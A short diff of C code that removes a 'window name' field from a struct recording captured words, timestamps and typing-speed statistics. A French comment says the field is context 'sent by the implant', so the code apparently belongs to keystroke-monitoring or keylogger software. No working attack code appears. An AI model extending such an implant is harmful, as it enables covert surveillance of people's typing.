@@ -5,7 +5,6 @@
 
 struct WordMetadata {
     char word[256];
-    char windowName[64];  // Le contexte envoyé par l'implant
     uint32_t timestamp;
     float avgInterval;     // Vitesse (sec)
     float variance;        // Stabilité
